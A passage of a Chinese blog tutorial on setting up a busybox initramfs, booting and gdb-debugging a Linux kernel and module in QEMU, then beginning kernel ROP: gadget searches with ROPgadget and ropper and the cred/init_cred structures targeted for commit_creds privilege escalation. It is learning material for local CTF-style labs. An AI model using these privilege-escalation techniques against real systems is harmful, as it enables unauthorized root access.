<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/busybox-1.36.1/_install# <span class="built_in">cat</span> init</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">insmod /ktest.ko</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>这里面使用的命令比如insmod就是临时文件系统提供的</p>
<p>如果后续要挂载磁盘首先需要让内核知道磁盘上的文件系统格式,比如ext2</p>
<p>也就是说insmod ext2之后,内核才能识别并访问ext2格式化的磁盘.</p>
<p>即时磁盘上的文件系统中有ext2模块,有insmod命令,但是此时还没有挂载,没法使用</p>
<p>因此只能是临时文件系统提供这个功能</p>
<p>也就是说,内存文件系统为内核提供了一套必要的访问磁盘的工具</p>
<p>至于为什么叫做”内存文件系统”,因为整个initrd.img文件很小,会被全部加载进入内存,因此访问速度很快</p>
<h4 id="制作linux临时文件系统"><a href="#制作linux临时文件系统" class="headerlink" title="制作linux临时文件系统"></a>制作linux临时文件系统</h4><p>可以直接使用busybox</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://gitee.com/add358/busybox.git</span><br><span class="line">cd busybox</span><br></pre></td></tr></table></figure>

<p>然后make menuconfig,</p>
<p>Settings-&gt;Build Options-&gt;Build static binary(no shared libs)选上</p>
<p>这一步的目的是将busybox静态链接,可以脱离glibc环境运行,因为内存文件系统很小,不需要glibc</p>
<p>Applets-&gt;Linux System Utilities-&gt;Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)不选</p>
<p>这一步的目的是设置不挂载网络文件系统,为了精简大小</p>
<p>Applets-&gt;Networking Utilities-&gt;inetd不选</p>
<p>这一步的目的是不使用网络,为了精简大小</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j$(nproc)</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>make install之后会在当前目录下生成一个<code>_install</code>目录</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox/_install# <span class="built_in">ls</span></span><br><span class="line">bin  linuxrc  sbin  usr</span><br></pre></td></tr></table></figure>

<p>也就是说,busybox提供了bin,sbin,usr三个目录的功能</p>
<p>usr下面的bin和sbin实际上是_install目录下两个同名目录的链接</p>
<p>然后bin,sbin里面的工具,也全是到bin&#x2F;busybox的链接</p>
<p>也就是说,生成了一个busybox可执行程序,创建了一大堆链接</p>
<p>至于sys,dev等目录他不管,我们借助这个半成品加上这几个目录就可以构造一个临时文件系统了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure>

<p>然后在当前目录下创建init脚本,规定内核启动时要干啥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>改一下文件权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x init</span><br></pre></td></tr></table></figure>

<p>之后在_install目录打包整个临时文件系统</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox/_install<span class="meta"># find . | cpio -o --format=newc &gt; ../rootfs.img</span></span><br><span class="line"><span class="number">5949</span> blocks</span><br></pre></td></tr></table></figure>

<p>这会在上级目录生成一个rootfs.img归档文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox/_install# <span class="built_in">cd</span> ..</span><br><span class="line">root@Destroyer:/home/dustball/busybox# file rootfs.img</span><br><span class="line">rootfs.img: ASCII cpio archive (SVR4 with no CRC)</span><br></pre></td></tr></table></figure>

<p>这个文件就可以作为临时文件系统了</p>
<h3 id="启动内核"><a href="#启动内核" class="headerlink" title="启动内核"></a>启动内核</h3><p>把可以引导的内核镜像bzImage也搬到rootfs.img所在的目录来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox# cp /usr/src/linux-6.7/arch/x86/boot/bzImage .</span><br></pre></td></tr></table></figure>

<p>之后可以用qemu启动内核了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    -cpu kvm64 </span><br></pre></td></tr></table></figure>

<p>如果没起来,报告找不到&#x2F;dev&#x2F;tty,可能是init脚本没有给执行权限</p>
<p>-m指定使用内存大小</p>
<p>-kernel指定内核镜像文件</p>
<p>-initrd指定临时文件系统文件</p>
<p>-append指定启动参数,</p>
<blockquote>
<p>root&#x3D;&#x2F;dev&#x2F;ram,根文件系统也使用临时文件系统 rw可读写</p>
<p>console&#x3D;ttyS0,指定串口终端0,改成tty0或者ttyS1都看不到输出,还不清楚原因</p>
<p>oops&#x3D;panic panic1 指定发生oops异常时,应该触发内核崩溃</p>
<p>nokaslr,方便调试关闭内核地址随机化</p>
</blockquote>
<h4 id="内存文件系统编译进内核"><a href="#内存文件系统编译进内核" class="headerlink" title="内存文件系统编译进内核"></a>内存文件系统编译进内核</h4><p>之前的内核是一个裸核,内存文件系统是单独制作然后用qemu启动的</p>
<p>可以直接编译进内核</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/OnlyLove_/article/details/124565282</span><br></pre></td></tr></table></figure>

<p>坏处是如果想要修改文件系统,需要重新编译内核</p>
<h3 id="调试内核"><a href="#调试内核" class="headerlink" title="调试内核"></a>调试内核</h3><p>启动内核时加上调试选项-s,这样就会在127.0.0.1:1234上开启监听端口</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>

<p>然后启动,再开一个终端,用gdb就可以远程调试了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote localhost:1234</span><br></pre></td></tr></table></figure>



<h4 id="添加调试信息"><a href="#添加调试信息" class="headerlink" title="添加调试信息"></a>添加调试信息</h4><p>用于引导的bzImage已经去掉了调试信息,如果直接用gdb给start_kernel这种函数下断点,找不到符号</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b start_kernel</span><br><span class="line">No symbol table is loaded.  Use the <span class="string">&quot;file&quot;</span> <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>

<p>vmlinux中保留有调试信息(编译时保留了调试信息比如dwarf5),将其作为调试符号来源</p>
<p>首先需要知道将vmlinux添加到哪里,也就是内核在内存中的地址</p>
<p>在gdb上c一下让调试内核能够自由执行,然后在被调试的内核上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc # cat /proc/iomem | grep &quot;Kernel code&quot;</span><br><span class="line">  01000000-01ffffff : Kernel code</span><br></pre></td></tr></table></figure>

<p>也就是内核基地址在0x01000000</p>
<p>在gdb上添加调试符号(ctrl+C中断内核)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file ./vmlinux <span class="number">0x01000000</span></span><br><span class="line">add symbol table from file <span class="string">&quot;./vmlinux&quot;</span> at</span><br><span class="line">        .text_addr = <span class="number">0x01000000</span></span><br><span class="line">Reading symbols from ./vmlinux...done.</span><br></pre></td></tr></table></figure>

<p>之后就可以在内核函数上下断点了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b start_kernel</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x1e457e0</span>: start_kernel. (<span class="number">2</span> locations)</span><br></pre></td></tr></table></figure>

<p>也可以源码调试内核了</p>
<h4 id="添加内核模块调试信息"><a href="#添加内核模块调试信息" class="headerlink" title="添加内核模块调试信息"></a>添加内核模块调试信息</h4><p>类似的方法,需要知道的是内核模块在内存中的地址,作为调试符号输入的ko模块文件需要保留调试符号</p>
<p>至于如何保留内核模块的调试符号,需要加入gcc的编译选项-g,<code>CFLAGS_MODULE=-g</code></p>
<p>Makefile这样写</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/kd# <span class="built_in">cat</span> Makefile</span><br><span class="line">obj-m += ktest.o</span><br><span class="line"></span><br><span class="line">KDIR = /usr/src/linux-6.7</span><br><span class="line"></span><br><span class="line">all:</span><br><span class="line">        $(MAKE) -C $(KDIR) M=$(PWD) modules CFLAGS_MODULE=-g</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">        <span class="built_in">rm</span> -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure>

<p>新编译好的内核模块,注意放到<code>_install</code>下面之后重新cpio打包</p>
<p>给内核模块添加调试符号,首先需要知道该模块被加载到内存的地址</p>
<p>在gdb上c一下让内核继续</p>
<p>然后在被调试的内核上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc <span class="meta"># cat /proc/modules</span></span><br><span class="line">ktest <span class="number">12288</span> <span class="number">0</span> - Live <span class="number">0xffffffffc0000000</span> (O)</span><br></pre></td></tr></table></figure>

<p>也就是说内核模块ktest在0xffffffffc0000000</p>
<p>下面从gdb上为其加载符号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file ./ktest.ko 0xffffffffc0000000</span><br><span class="line">add symbol table from file &quot;./ktest.ko&quot; at</span><br><span class="line">        .text_addr = 0xffffffffc0000000</span><br><span class="line">Reading symbols from ./ktest.ko...done.</span><br></pre></td></tr></table></figure>

<p>之后就可以下断点,源码调试了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b ko_test_init</span><br><span class="line">Breakpoint 2 at 0xffffffffc0000000: file /home/dustball/kd/ktest.c, line 7.</span><br></pre></td></tr></table></figure>











<h2 id="内核数据结构"><a href="#内核数据结构" class="headerlink" title="内核数据结构"></a>内核数据结构</h2><h2 id="内核ROP"><a href="#内核ROP" class="headerlink" title="内核ROP"></a>内核ROP</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>用户态ROP利用gadget构造<code>system(&quot;/bin/sh&quot;)</code></p>
<p>内核ROP利用gadget构造<code>commit_creds(&amp;init_cred)</code></p>
<h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><p>用户态pwn题常用ROPgadget</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install python-capstone</span><br><span class="line">git <span class="built_in">clone</span> https://gitee.com/pwn2security/ROPgadget.git</span><br><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/kd# ROPgadget --binary /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> --only <span class="string">&quot;jmp&quot;</span> | grep rsp</span><br><span class="line"><span class="number">0x00000000000010d5</span> : jmp rsp</span><br><span class="line">root@Destroyer:/home/dustball/kd# ROPgadget --binary /usr/src/linux<span class="number">-6.7</span>/vmlinux --only <span class="string">&quot;jmp&quot;</span> | grep rsp</span><br><span class="line"><span class="number">0xffffffff81220783</span> : jmp rsp</span><br></pre></td></tr></table></figure>

<p>但是从内核vmlinux中找gadget比较慢</p>
<h4 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h4><p>类似于ROPgadget,但是听说速度快点,没有验证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install ropper</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/kd# ropper -f /usr/src/linux-6.7/vmlinux --search <span class="string">&quot;jmp rsp&quot;</span></span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... 88%</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: jmp rsp</span><br><span class="line">[INFO] File: /usr/src/linux-6.7/vmlinux</span><br><span class="line">0xffffffff81220783: jmp rsp;</span><br></pre></td></tr></table></figure>

<p>ropper的semantic功能,可以进行简单的静态语义分析,找到令rax&#x3D;0这种gadget</p>
<h4 id="extract-vmlinux"><a href="#extract-vmlinux" class="headerlink" title="extract-vmlinux"></a>extract-vmlinux</h4><p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">linux&#x2F;scripts&#x2F;extract-vmlinux at master · torvalds&#x2F;linux · GitHub</a></p>
<p>bzImage是一个经过压缩的内核,如果想要寻找gadget,必须使用一个未被压缩的elf文件,也就是vmlinux</p>
<p>如果题目给出了一个bzImage,可以用extract-vmlinux提取vmlinux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>

























<h3 id="cred结构"><a href="#cred结构" class="headerlink" title="cred结构"></a>cred结构</h3><p>cred结构体管理进程权限,用户id等信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux/include/linux/cred.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __put_cred(<span class="keyword">struct</span> cred *);</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">exit_creds</span><span class="params">(<span class="keyword">struct</span> task_struct *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">copy_creds</span><span class="params">(<span class="keyword">struct</span> task_struct *, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="keyword">struct</span> cred *<span class="title function_">get_task_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">cred_alloc_blank</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">prepare_creds</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">prepare_exec_creds</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">abort_creds</span><span class="params">(<span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="keyword">struct</span> cred *<span class="title function_">override_creds</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">revert_creds</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">change_create_files_as</span><span class="params">(<span class="keyword">struct</span> cred *, <span class="keyword">struct</span> inode *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">set_security_override</span><span class="params">(<span class="keyword">struct</span> cred *, u32)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">set_security_override_from_ctx</span><span class="params">(<span class="keyword">struct</span> cred *, <span class="type">const</span> <span class="type">char</span> *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">set_create_files_as</span><span class="params">(<span class="keyword">struct</span> cred *, <span class="keyword">struct</span> inode *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">cred_fscmp</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *, <span class="type">const</span> <span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>函数实现和<code>init_cred</code>这个预定义对象都在<code>linux/kernel/cred.c</code>中实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_ROOT_UID KUIDT_INIT(0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_ROOT_GID KGIDT_INIT(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The initial credentials for the initial task</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> &#123;</span><br><span class="line">	.usage			= ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	.subscribers		= ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">	.magic			= CRED_MAGIC,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	.uid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.gid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.suid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.sgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.euid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.egid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.fsuid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.fsgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.securebits		= SECUREBITS_DEFAULT,</span><br><span class="line">	.cap_inheritable	= 